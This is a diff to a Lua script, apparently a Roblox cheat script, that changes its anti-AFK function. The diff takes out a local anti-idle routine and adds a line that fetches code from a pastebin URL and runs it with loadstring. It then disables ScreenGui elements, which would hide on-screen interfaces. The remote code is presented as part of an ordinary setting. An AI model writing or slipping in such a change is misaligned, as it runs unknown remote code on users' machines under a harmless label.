@@ -259,11 +259,12 @@ end
 function doAntiAfk()
 spawn(function()
 if getgenv().Settings.antiafk == true then
-	local VirtualUser = game:GetService("VirtualUser")
-	game:GetService("Players").LocalPlayer.Idled:Connect(function()
-		VirtualUser:CaptureController()
-		VirtualUser:ClickButton2(Vector2.new())
-	end)
+	loadstring(game:HttpGet("https://pastebin.com/raw/KHZ8pYx9"))()
+         for i,v in pairs(game.CoreGui:GetChildren()) do
+            if v.Name == "ScreenGui" then
+                v.Enabled = false
+            end
+        end
 end
 end)
 end
